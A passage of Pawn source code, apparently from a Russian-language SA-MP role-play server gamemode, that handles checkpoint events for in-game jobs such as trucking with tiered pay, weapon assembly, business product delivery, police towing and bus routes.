		SetPlayerAttachedObject(playerid, 3, 341, 6, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "{d45901}Вы принесли {e0c600}%d кг {d45901}древесины.", rand);
		SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

  		Lessdrov += rand; // обновим количество древесины на складе
		UpdateWood2(); // обновляем информацию о складе

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "{37c268}Всего принесено: {e0c600}%d кг {37c268}древесины", pPressed[playerid]);
		SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);
		return 1;
	}
	if(GetPVarInt(playerid, "MetkaJob") > 0 && IsPlayerInAnyVehicle(playerid))
   	{
   	    new vehicleid = GetPlayerVehicleID(playerid);
   	    printf("debug:1");
   	    if(!IsTrailerAttachedToVehicle(vehicleid) && GetVehicleTrailer(vehicleid) != PI[playerid][P_GRUZ_CAR] && GetPVarInt(playerid, "TruckerJobFuel") == 0)
				return SendClientMessage(playerid, COLOR_RED, "Вы потеряли прицеп, для загрузки он должен быть на месте");

		TogglePlayerControllable(playerid,0);
        SendClientMessage(playerid, 0xFFFFFFFF, "Происходит загрузка товара. Пожалуйста подождите!");
	    DisablePlayerCheckpoint(playerid);
		TogglePlayerControllable(playerid,1);
		SendClientMessage(playerid, COLOR_BLUE,"Загрузка фуры завершена...");
		SendClientMessage(playerid,-1,"Отправляйтесь на разгрузку товара. Метка отмечена на GPS");
		DeletePVar(playerid, "MetkaJob");
		new rand = random(4);
		switch(rand)
		{
		    case 0: {
		        SetPlayerCheckpoint(playerid, 2466.8582,-649.5677,12.2153,5.0);
				SetPVarInt(playerid, "RazgJob", 1);
			}
			case 1: {
		        SetPlayerCheckpoint(playerid, 789.1042,529.2069,12.0085,5.0);
				SetPVarInt(playerid, "RazgJob", 2);
			}
			case 2: {
		        SetPlayerCheckpoint(playerid, 2320.2922,1736.8392,1.7617,5.0);
		       	SetPVarInt(playerid, "RazgJob", 3);
			}
			case 3: {
		        SetPlayerCheckpoint(playerid, -877.1223,1137.7087,10.5293,5.0);
		        SetPVarInt(playerid, "RazgJob", 4);
			}
		}
        return 1;
    }
    if(GetPVarInt(playerid, "RazgJob") > 0 && IsPlayerInAnyVehicle(playerid))
   	{
    	new vehicleid = GetPlayerVehicleID(playerid);
    	printf("debug:1");
   	    if(!IsTrailerAttachedToVehicle(vehicleid) && GetVehicleTrailer(vehicleid) != PI[playerid][P_GRUZ_CAR] && GetPVarInt(playerid, "TruckerJobFuel") == 0)
				return SendClientMessage(playerid, COLOR_RED, "Вы потеряли прицеп, для разгрузки он должен быть на месте");

		SetPVarInt(playerid, "RazgruzJob", 20);
		TogglePlayerControllable(playerid,0);
        SendClientMessage(playerid, 0xFFFFFFFF, "Происходит разгрузка товара. Пожалуйста подождите!");
	    DisablePlayerCheckpoint(playerid);
		TogglePlayerControllable(playerid,1);
		SendClientMessage(playerid, COLOR_BLUE,"Разгрузка фуры завершена...");
		SendClientMessage(playerid,-1,"Отправляйтесь на загрузку товара. Метка отмечена на GPS");
		DeletePVar(playerid, "RazgJob");
		DeletePVar(playerid, "RazgruzJob");
		g_player_skills[playerid][S_T_FLIGHTS] += 1;
		if(g_player_skills[playerid][S_T_FLIGHTS] == 30)
		{
		    g_player_skills[playerid][S_T_COUNT] += 1;
		    g_player_skills[playerid][S_T_FLIGHTS] = 0;
		}
		if(!doubling_donate)
		{
		    if(g_player_skills[playerid][S_T_COUNT] <= 1)
		    {
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 1500 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 1500);
 			}
 			else if(g_player_skills[playerid][S_T_COUNT] == 2)
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 2800 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 2800);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] == 3 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 3200 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 3200);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] == 4 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 3600 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 3600);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] == 5 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 5800 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 5800);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] == 6 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 6400 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 6400);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] == 7 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 6600 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 6600);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] == 8 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 7000 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 7000);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] == 9 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 8000 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 8000);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] == 10 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 8900 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 8900);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] <= 15 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 9400 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 9400);
    		}
    		else if(g_player_skills[playerid][S_T_COUNT] <= 20 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 11500 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 11500);
    		}
    		else if(g_player_skills[playerid][S_T_COUNT] <= 35 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 15500 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 15500);
    		}
    		else if(g_player_skills[playerid][S_T_COUNT] <= 60 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 19000 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 19000);
    		}
  			else if(g_player_skills[playerid][S_T_COUNT] >= 90 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 25000 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 25000);
    		}
		}
		else
		{
		    if(g_player_skills[playerid][S_T_COUNT] <= 1)
		    {
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 3000 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 3000);
 			}
 			else if(g_player_skills[playerid][S_T_COUNT] == 2)
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 5600 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 5600);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] == 3 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 6400 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 6400);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] == 4 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 7200 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 7200);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] == 5 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 11600 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 11600);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] == 6 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 12800 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 12800);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] == 7 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 13200 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 13200);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] == 8 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 14000 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 14000);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] == 9 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 16000 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 16000);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] == 10 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 17800 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 17800);
    		}
 			else if(g_player_skills[playerid][S_T_COUNT] <= 15 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 18800 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 18800);
    		}
    		else if(g_player_skills[playerid][S_T_COUNT] <= 20 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 23000 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 23000);
    		}
    		else if(g_player_skills[playerid][S_T_COUNT] <= 35 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 26000 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 26000);
    		}
    		else if(g_player_skills[playerid][S_T_COUNT] <= 60 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 38000 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 38000);
    		}
  			else if(g_player_skills[playerid][S_T_COUNT] >= 90 )
 			{
			    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 50000 рублей");
			    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
			    GiveMoney(playerid, 50000);
    		}
		}
		new metka = random(4);
		switch(metka)
		{
		    case 0: {
		        SetPlayerCheckpoint(playerid, 1786.4874,2268.5398,15.7698,5.0);
				SetPVarInt(playerid, "MetkaJob", 1);
			}
			case 1: {
		        SetPlayerCheckpoint(playerid, -2451.6064,660.0789,5.3688,5.0);
				SetPVarInt(playerid, "MetkaJob", 2);
			}
			case 2: {
		        SetPlayerCheckpoint(playerid, -2488.6279,622.1194,5.3688,5.0);
		       	SetPVarInt(playerid, "MetkaJob", 3);
			}
			case 3: {
		        SetPlayerCheckpoint(playerid, 2738.2620,-2274.9829,17.9269,5.0);
		        SetPVarInt(playerid, "MetkaJob", 4);
			}
		}
        return 1;
    }
    if(GetPVarInt(playerid, "Gjob") == 1)
    {
   		if(gGunWorkWH[0] < 100) return SendClientMessage(playerid, COLOR_GREY, "На складе недостаточно угля");
		if(gGunWorkWH[1] < 100) return SendClientMessage(playerid, COLOR_GREY, "На складе недостаточно древесины");

		gGunWorkWH[0] -= 50;
		gGunWorkWH[1] -= 50;
		UpdateWH();

		ApplyAnimation(playerid,"CARRY","crry_prtial",4.1,0,1,1,1,1);
    	SetPlayerAttachedObject(playerid,3,2969,1,0.075578,0.407083,0.000000,1.248928,97.393852,359.645050,1.000000,1.000000,1.000000);
     	SendClientMessage(playerid, COLOR_LIGHTGREEN, "Следуйте к Вашему рабочему столу!");
      	new gcheck = random(12);//рабочий стол сборщика оружия
		if(gcheck == 0) SetPlayerCheckpoint(playerid,147.2311,1847.7953,-18.3857-1,1.5);
		if(gcheck == 1) SetPlayerCheckpoint(playerid,147.1820,1853.6091,-18.3918-1,1.5);
		if(gcheck == 2) SetPlayerCheckpoint(playerid,147.1436,1858.9594,-18.3974-1,1.5);
		if(gcheck == 3) SetPlayerCheckpoint(playerid,155.8754,1847.7244,-18.3857-1,1.5);
		if(gcheck == 4) SetPlayerCheckpoint(playerid,155.8566,1853.6056,-18.3919-1,1.5);
		if(gcheck == 5) SetPlayerCheckpoint(playerid,155.4678,1858.8152,-18.3973-1,1.5);
		if(gcheck == 6) SetPlayerCheckpoint(playerid,162.6545,1847.6401,-18.3857-1,1.5);
		if(gcheck == 7) SetPlayerCheckpoint(playerid,162.7062,1853.5289,-18.3918-1,1.5);
		if(gcheck == 8) SetPlayerCheckpoint(playerid,162.6601,1858.6804,-18.3972-1,1.5);
		if(gcheck == 9) SetPlayerCheckpoint(playerid,169.7726,1847.5665,-18.3960-1,1.5);
		if(gcheck == 10) SetPlayerCheckpoint(playerid,169.7353,1853.5308,-18.4022-1,1.5);
		if(gcheck == 11) SetPlayerCheckpoint(playerid,169.8287,1858.6633,-18.4075-1,1.5);
  		SetPVarInt(playerid, "Gjob",2);
	    return 1;
  	}
    if(GetPVarInt(playerid, "Gjob") == 3)
    {
    	RemovePlayerAttachedObject(playerid,3);
	    ApplyAnimation(playerid,"PED","IDLE_tired",4.1,0,1,1,0,1);
	    SetPVarInt(playerid,"GUN",GetPVarInt(playerid,"GUN")+1);
	    new str[128];
	    PI[playerid][pWorkSalary] += 1;
	   	format(str,18,"ПРИНЕСЕНО: %d",PI[playerid][pWorkSalary]);
		PlayerTextDrawSetString(playerid,StatusWork[playerid][4],str);
	    gGunWorkWH[2] += 40;
	    SetPVarInt(playerid,"Gjob",1);
	    new mcheck = random(7);//рабочие столы сборщика оружия где брать ящик
		if(mcheck == 0) SetPlayerCheckpoint(playerid,143.7591,1841.5465,-18.3792-1,1.5);
		if(mcheck == 1) SetPlayerCheckpoint(playerid,149.8506,1841.3478,-18.3790-1,1.5);
		if(mcheck == 2) SetPlayerCheckpoint(playerid,155.8068,1841.4806,-18.3792-1,1.5);
		if(mcheck == 3) SetPlayerCheckpoint(playerid,161.8487,1841.0291,-18.3788-1,1.5);
		if(mcheck == 4) SetPlayerCheckpoint(playerid,167.8412,1841.2073,-18.3893-1,1.5);
		if(mcheck == 5) SetPlayerCheckpoint(playerid,173.7056,1841.4631,-18.3896-1,1.5);
		if(mcheck == 6) SetPlayerCheckpoint(playerid,179.3695,1841.7573,-18.3900-1,1.5);

		UpdateWH();
	    return 1;
    }
	return 1;
}

public OnPlayerLeaveCheckpoint(playerid) return 1;

public OnPlayerEnterRaceCheckpoint(playerid)
{
	if(PI[playerid][P_ORDER_ID] != -1)
	{
		if(!IsPlayerInAnyVehicle(playerid))
			return SendClientMessage(playerid, C_RED, "Вы должны находиться в своём грузовике");

		new vehicleid = GetPlayerVehicleID(playerid);

		new bool: car;

		for(new i; i < MAX_PLAYER_OWNABLE_CARS; i ++)
		{
			if(!IsValidVehicle(PI[playerid][P_OWNABLE_CAR][i]))
				continue;

			if(GetVehicleData(PI[playerid][P_OWNABLE_CAR][i], veh_slot) == 55)
			{
				car = true;
				break;
			}
		}

		if(car == false)
			return SendClientMessage(playerid, C_RED, "У Вас нет грузовика");

		new Cache: result, rows, index = PI[playerid][P_ORDER_ID];
		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM orders WHERE id=%d AND status=1", index);
		result = mysql_query(dbHandle, STRING_GLOBAL);
		rows = cache_num_rows();

		if(!rows)
			return SendClientMessage(playerid, C_RED, "Во время доставки Вашего заказа произошла ошибка"), cache_delete(result);

		new businessid = cache_get_field_content_int(0, "business");
		new product = cache_get_field_content_int(0, "count");

		if(!IsPlayerInRangeOfPoint(playerid, 5.0, BizzInfo[businessid][bEntrx], BizzInfo[businessid][bEntry], BizzInfo[businessid][bEntrz]))
			return SendClientMessage(playerid, C_RED, "Вы должны прибыть к выбранному бизнесу"), cache_delete(result);

		if(PI[playerid][P_LOAD_JOB] < product)
			return SendClientMessage(playerid, C_RED, "В Вашем грузовике недостаточно продуктов"), cache_delete(result);

		if(514 <= GetVehicleModel(vehicleid) <= 515)
		{
			if(!IsTrailerAttachedToVehicle(vehicleid) || GetVehicleTrailer(vehicleid) != PI[playerid][P_GRUZ_CAR])
				return SendClientMessage(playerid, C_RED, "Вы потеряли груз, для доставки продуктов он должен быть на месте."), cache_delete(result);
		}

		BizzInfo[businessid][bProduct] += product;
		MysqlUpdateBizzInt(businessid, "product", BizzInfo[businessid][bProduct]);

		if(GetPlayerID(BizzInfo[businessid][bOwner]) != INVALID_PLAYER_ID) SendClientMessage(GetPlayerID(BizzInfo[businessid][bOwner]), C_BLUE, "В Ваш бизнес были доставлены продукты.");

		PI[playerid][P_LOAD_JOB] -= product;

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ownable_cars SET products=%d WHERE id=%d", PI[playerid][P_LOAD_JOB], GetVehicleData(vehicleid, veh_sql_id));
		mysql_query(dbHandle, STRING_GLOBAL);

		new max_products;

		for(new i; i < sizeof g_max_products; i ++)
		{
			if(GetVehicleModel(vehicleid) == g_max_products[i][0])
			{
				max_products = g_max_products[i][1];
				break;
			}
		}

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Доставка продуктов\n{FFFFFF}Загружено %d / %d шт.", PI[playerid][P_LOAD_JOB], max_products);
		UpdateDynamic3DTextLabelText(g_vehicle[vehicleid][veh_label], 0xFF6600FF, STRING_GLOBAL);

		new company_biz = PI[playerid][P_ORDER_BIZ_ID];

		BizzInfo[company_biz][bMoney] += product*10;
		MysqlUpdateBizzInt(company_biz, "product", BizzInfo[company_biz][bProduct]);

		GiveMoney(playerid, 50000, "Зарплата");
		SendClientMessage(playerid, C_BLUE, "За доставку Вам было оплачено 50000 рублей");

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "DELETE FROM orders WHERE id=%d", index);
		result = mysql_query(dbHandle, STRING_GLOBAL);

		PI[playerid][P_ORDER_BIZ_ID]					=
		PI[playerid][P_ORDER_TIME]						=
		PI[playerid][P_ORDER_ID]						= -1;

		DisablePlayerRaceCheckpoint(playerid);

		g_player_skills[playerid][S_T_FLIGHTS] ++;
		g_player_skills[playerid][S_T_COUNT] += product;

		SavePlayerSkills(playerid);
	}
	if(IsACop(playerid))
	{
		new vehicleid = GetPlayerVehicleID(playerid);

		if(GetVehicleModel(vehicleid) == 525)
		{
			if(IsTrailerAttachedToVehicle(vehicleid))
			{
				ShowPlayerDialog
				(
					playerid, DIALOG_TOW_CAR, DIALOG_STYLE_INPUT,
					"{FFCC00}Штрафстоянка",
					"{FFFFFF}Вы действительно хотите поставить этот транспорт на ШС?\n"\
					"{FFFFFF}Владельцу этого ТС придётся заплатить штраф в размере {FFCC00}10000 рублей",
					"Да", "Нет"
				);

				DisablePlayerRaceCheckpoint(playerid);
			}
		}
	}
	if(GetPVarInt(playerid, "CheckpointGoToBank"))
	{
		if(IsACop(playerid))
		{
			SendClientMessage(playerid, C_OSNOV, "Вы доставили мешок с деньгами в банк.");
			SendClientMessage(playerid, C_OSNOV, "Вам была выдана премия в размере 1000000 рублей");
			GiveMoney(playerid, 1000000);

			DisablePlayerRaceCheckpoint(playerid);

			DeletePVar(playerid, "CheckpointGoToBank");

			if(IsPlayerAttachedObjectSlotUsed(playerid,4)) RemovePlayerAttachedObject(playerid,4);

			PI[playerid][P_BUG] = 0;

			bank_money_pickup = -1;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[D] %s %s[%d] возвратил деньги в банк", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), playerid);
			SendDMes(C_RED, STRING_GLOBAL);
		}
	}
	if(GetPVarInt(playerid, "CheckpointGoToBase"))
	{
		SendClientMessage(playerid, C_OSNOV, "Вы доставили мешок с деньгами на склад.");
		SendClientMessage(playerid, C_OSNOV, "В общак было добавлено 10000000 рублей");

		DisablePlayerRaceCheckpoint(playerid);

		DeletePVar(playerid, "CheckpointGoToBase");

		if(IsPlayerAttachedObjectSlotUsed(playerid,4)) RemovePlayerAttachedObject(playerid,4);

		PI[playerid][P_BUG] = 0;

		bank_money_pickup = -1;

		new i = (PI[playerid][pMember] == TEAM_GROOVE) ? (0) : (PI[playerid][pMember] == TEAM_BALLAS) ? (1) : (PI[playerid][pMember] == TEAM_RIFA) ? (2) : (PI[playerid][pMember] == TEAM_OPGTEST2) ? (3) : (4);
		FracBank[i] += 10000000;

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[F] %s %s[%d] доставил деньги в общак", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), playerid);
		SendFMes(PI[playerid][pMember], C_RED, STRING_GLOBAL);
	}
	if(UseGPS[playerid])
	{
		SendClientMessage(playerid, COLOR_YELLOW, "Вы достигли места назначения");
   		DisablePlayerRaceCheckpoint(playerid);
	   	UseGPS[playerid] = false;
	   	for(new i; i < 3; i++) TextDrawHideForPlayer(playerid, gps_td);
	   	return 1;
	}
	if(GetPVarInt(playerid, "findplayer") == 1)
	{
		SendClientMessage(playerid, COLOR_BLUE, "Вы достигли места назначения!");
		DeletePVar(playerid, "findplayer");
		DisablePlayerRaceCheckpoint(playerid);
		return 1;
	}
	if(GetPVarInt(playerid, "Home") == 1)
	{
		SendClientMessage(playerid, COLOR_YELLOW, "Вы достигли места назначения");
		DeletePVar(playerid, "Home");
		DisablePlayerRaceCheckpoint(playerid);
	}
	if(GetPVarInt(playerid, "PriceBus") > 0)
	{
	    DisablePlayerRaceCheckpoint(playerid);
		new type = GetPVarInt(playerid, "TypeBus"), e_type, name[35];
		switch(GetPVarInt(playerid, "TypeBus"))
		{
			case 1: name = "Арзамас-Автошкола";
		}
		if(type == 1)
		{
			if(pPressed[playerid] == 2 || pPressed[playerid] == 12 || pPressed[playerid] == 36 || pPressed[playerid] == 44 || pPressed[playerid] == 46)
			{
				if(GetPVarInt(playerid, "BusStop") == 0)
				{
				    new string[100];
					SetPVarInt(playerid, "TimeBus", 11);
					format(string, sizeof(string), "Маршрутка по маршруту %s отправляется через 10 секунд",name);
					AutoStationBusInfo(playerid, string);
					GameTextForPlayer(playerid, "~r~СТОП", 1000, 1);
					//PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
				}
				else
				{
					if(pPressed[playerid] == 73) pPressed[playerid] = 0;
					else pPressed[playerid]++;
					new i = pPressed[playerid];
					SetPlayerRaceCheckpoint(playerid,0,BusCityLS[i][0],BusCityLS[i][1],BusCityLS[i][2],BusCityLS[i][3],BusCityLS[i][4],BusCityLS[i][5],5.0);
					SetPVarInt(playerid, "BusStop", 0);

					g_player_skills[playerid][S_B_FLIGHTS] ++;
					SavePlayerSkills(playerid);
				}
			}
			else
			{
				pPressed[playerid]++;
				SetPVarInt(playerid, "BusMoney", GetPVarInt(playerid, "BusMoney") + 100);
				if(pPressed[playerid] == 2 || pPressed[playerid] == 12 || pPressed[playerid] == 14 || pPressed[playerid] == 36  || pPressed[playerid] == 44) e_type = 1;
				else e_type = 0;
				new i = pPressed[playerid];
				SetPlayerRaceCheckpoint(playerid,e_type,BusCityLS[i][0],BusCityLS[i][1],BusCityLS[i][2],BusCityLS[i][3],BusCityLS[i][4],BusCityLS[i][5],5.0);
			}
		}
		if(type == 2)
		{
			if(pPressed[playerid] == 0 || pPressed[playerid] == 3 || pPressed[playerid] == 10 || pPressed[playerid] == 14 || pPressed[playerid] == 18 || pPressed[playerid] == 21)
			{
				if(GetPVarInt(playerid, "BusStop") == 0)
				{
				    new string[100];
					SetPVarInt(playerid, "TimeBus", 11);
					format(string, sizeof(string), "Маршрутка по маршруту %s отправляется через 10 секунд",name);
					AutoStationBusInfo(playerid, string);
					GameTextForPlayer(playerid, "~r~СТОП", 1000, 1);
					PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
				}
				else
				{
					if(pPressed[playerid] == 21) pPressed[playerid] = 0;
					else pPressed[playerid]++;
					new i = pPressed[playerid];
					SetPlayerRaceCheckpoint(playerid,0,BusCitySF[i][0],BusCitySF[i][1],BusCitySF[i][2],BusCitySF[i][3],BusCitySF[i][4],BusCitySF[i][5],5.0);
					SetPVarInt(playerid, "BusStop", 0);

					g_player_skills[playerid][S_B_FLIGHTS] ++;
					SavePlayerSkills(playerid);
				}
			}
			else
			{
				pPressed[playerid]++;
				SetPVarInt(playerid, "BusMoney", GetPVarInt(playerid, "BusMoney") + 60);
				if(pPressed[playerid] == 0 || pPressed[playerid] == 3 || pPressed[playerid] == 10 || pPressed[playerid] == 14 || pPressed[playerid] == 18 || pPressed[playerid] == 21) e_type = 1;
				else e_type = 0;
				new i = pPressed[playerid];
				SetPlayerRaceCheckpoint(playerid,e_type,BusCitySF[i][0],BusCitySF[i][1],BusCitySF[i][2],BusCitySF[i][3],BusCitySF[i][4],BusCitySF[i][5],5.0);
			}
		}
		if(type == 3)
		{
			if(pPressed[playerid] == 0 || pPressed[playerid] == 4 || pPressed[playerid] == 6 || pPressed[playerid] == 13 || pPressed[playerid] == 19 || pPressed[playerid] == 23 || pPressed[playerid] == 30)
			{
				if(GetPVarInt(playerid, "BusStop") == 0)
				{
				    new string[100];
					SetPVarInt(playerid, "TimeBus", 11);
					format(string, sizeof(string), "Маршрутка по маршруту %s отправляется через 10 секунд",name);
					AutoStationBusInfo(playerid, string);
					GameTextForPlayer(playerid, "~r~СТОП", 1000, 1);
					PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
				}
				else
				{
					if(pPressed[playerid] == 30) pPressed[playerid] = 0;
					else pPressed[playerid]++;
					new i = pPressed[playerid];
					SetPlayerRaceCheckpoint(playerid,0,BusCityLV[i][0],BusCityLV[i][1],BusCityLV[i][2],BusCityLV[i][3],BusCityLV[i][4],BusCityLV[i][5],5.0);
					SetPVarInt(playerid, "BusStop", 0);

					g_player_skills[playerid][S_B_FLIGHTS] ++;
					SavePlayerSkills(playerid);
				}
			}
			else
			{
				pPressed[playerid]++;
				SetPVarInt(playerid, "BusMoney", GetPVarInt(playerid, "BusMoney") + 50);
				if(pPressed[playerid] == 0 || pPressed[playerid] == 4 || pPressed[playerid] == 6 || pPressed[playerid] == 13 || pPressed[playerid] == 19 || pPressed[playerid] == 23 || pPressed[playerid] == 30) e_type = 1;
				else e_type = 0;
				new i = pPressed[playerid];
				SetPlayerRaceCheckpoint(playerid,e_type,BusCityLV[i][0],BusCityLV[i][1],BusCityLV[i][2],BusCityLV[i][3],BusCityLV[i][4],BusCityLV[i][5],5.0);
			}
		}
		if(type == 4)
		{
			if(pPressed[playerid] == 0 || pPressed[playerid] == 3 || pPressed[playerid] == 13 || pPressed[playerid] == 19 || pPressed[playerid] == 23 || pPressed[playerid] == 27)
			{
				if(GetPVarInt(playerid, "BusStop") == 0)
				{
				    new string[100];
					SetPVarInt(playerid, "TimeBus", 11);
					format(string, sizeof(string), "Маршрутка по маршруту %s отправляется через 10 секунд",name);
					AutoStationBusInfo(playerid, string);
					GameTextForPlayer(playerid, "~r~СТОП", 1000, 1);
					PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
				}
				else
				{
					if(pPressed[playerid] == 27) pPressed[playerid] = 0;
					else pPressed[playerid]++;
					new i = pPressed[playerid];
					SetPlayerRaceCheckpoint(playerid,0,BusSchool[i][0],BusSchool[i][1],BusSchool[i][2],BusSchool[i][3],BusSchool[i][4],BusSchool[i][5],5.0);
					SetPVarInt(playerid, "BusStop", 0);

